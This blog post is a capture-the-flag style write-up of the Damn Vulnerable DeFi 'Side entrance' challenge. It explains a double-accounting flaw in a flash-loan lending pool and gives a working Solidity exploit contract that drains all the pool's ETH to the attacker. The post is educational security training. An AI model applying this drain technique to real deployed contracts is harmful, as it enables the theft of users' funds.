---
title: 'Damn Vulnerable DeFi Challenge #4 Solution — Side entrance'
excerpt: 'Damn Vulnerable DeFi is the war game created by @tinchoabbate to learn offensive security of DeFi smart contracts.</br></br>The endgoal of this challenge is to leverage the free (no fee) flashloans to drain the pool.'
coverImage:
  url: '/assets/blog/ethereum.jpg'
  credit:
    name: Nenad Novaković
    url: https://unsplash.com/@dvlden
date: '2020-04-12T07:00:00.000Z'
author:
  name: Emanuele Ricci
  twitter: StErMi
  picture: '/assets/blog/authors/stermi.jpeg'
ogImage:
  url: '/assets/blog/ethereum.jpg'
---

[Damn Vulnerable DeFi](https://www.damnvulnerabledefi.xyz/index.html) is the war game created by [@tinchoabbate](https://twitter.com/tinchoabbate) to learn offensive security of DeFi smart contracts.

Throughout numerous challenges, you will build the skills to become a bug hunter or security auditor in the space.

## Challenge #4  —  Side entrance

> A surprisingly simple lending pool allows anyone to deposit ETH, and withdraw it at any point in time.
>
> This very simple lending pool has 1000 ETH in balance already, and is offering free flash loans using the deposited ETH to promote their system.
>
> You must take all ETH from the lending pool.

- [See contracts](https://github.com/tinchoabbate/damn-vulnerable-defi/tree/v2.0.0/contracts/side-entrance)
- [Hack it](https://github.com/tinchoabbate/damn-vulnerable-defi/blob/v2.0.0/test/side-entrance/side-entrance.challenge.js)

## The attacker end goal

The endgoal of this challenge is to leverage the free (no fee) flashloans to drain the pool.

## Study the contracts

### `SideEntranceLenderPool`

The contract use `pragma solidity ^0.8.0;` so it will not be prone to math overflow/underflow

It has a `deposit` function where a supplier could send ETH. The function just account for your balance doing `balances[msg.sender] += msg.value;`. As we said, there’s no overflow/underflow problem given the Solidity version used.

It has a `withdraw` function that does not implement a Reentrancy guard, but it’s safe because it correctly follows the [Checks-Effects-Interactions Pattern](https://docs.soliditylang.org/en/v0.8.13/security-considerations.html#use-the-checks-effects-interactions-pattern) for which you update the internal state of the contract **before** any external interaction.  
In this function, the contract just get the account balance, reset it to 0 and send all the ETH back to the user.

The last function is the `flashLoan` one that takes only the `amount` to borrow as input parameter.

Inside the function the contract check that it has enough balance to allow the borrow operation, send the borrowed amount to the user calling `IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();` and finally check that after the loan has been executed the new balance (`address(_this_).balance`) is greater or equal of the old one (`balanceBefore`).

The issue with this contract is that they have two types of “accounting” system. One for the suppliers that can send and withdraw their ETH and another for the flash loans, that just take in considerations the balance of the contract but not the amount deposited on the user balances!

So, how could we take advantage of this issue?

## Solution code

First we need to create a new Contract because as you can see, only a contract can execute and receive the flash loans.

This temporary contract will

- Execute the flashloan
- Receive the funds implementing a `receive` function
- Deposit all the borrowed ETH into lending pool via the `deposit` function
- Repay back `0` ETH to the Lending Pool
- Withdraw all the deposited ETH from the Lending Pool
- Send to the attacker account the withdrawn ETH

How can this work? Well, because the Lending Pool allow us to `deposit` ETH it cannot (with the current implementation) know if those funds are from borrowed ETH or “normal” ETH.

So, when at the end of the `flashLoan` function it will check

`require(address(_this_).balance >= balanceBefore, “Flash loan hasn’t been paid back”);`

it will pass because we effectively deposited back all the borrowed ETH, with the exception that now we can withdraw them back because they have been accounted in our `balances[msg.sender]`

```solidity
// Do not use this code
// Part of the https://www.damnvulnerabledefi.xyz/ challenge

contract Executor is IFlashLoanEtherReceiver {
    using Address for address payable;

    SideEntranceLenderPool pool;
    address owner;

    constructor(SideEntranceLenderPool _pool) {
        owner = msg.sender;
        pool = _pool;
    }

    function execute() external payable {
        require(msg.sender == address(pool), "only pool");
        // receive flash loan and call pool.deposit depositing the loaned amount
        pool.deposit{value: msg.value}();
    }

    function borrow() external {
        require(msg.sender == owner, "only owner");
        uint256 poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);

        // we have deposited inside the `execute` method so we withdraw the deposited borrow
        pool.withdraw();

        // now we transfer received pool balance to the owner (attacker)
        payable(owner).sendValue(address(this).balance);
    }

    receive () external payable {}
}
```

You can find the full solution on GitHub, looking at [SideEntranceLenderPool.t.sol](https://github.com/StErMi/forge-damn-vulnerable-defi/blob/main/src/test/side-entrance/SideEntranceLenderPool.t.sol)

If you want to try yourself locally, just execute `forge test --match-contract SideEntranceLenderPooolTest -vv`

## Disclaimer

All Solidity code, practices and patterns in this repository are DAMN VULNERABLE and for educational purposes only.

DO NOT USE IN PRODUCTION
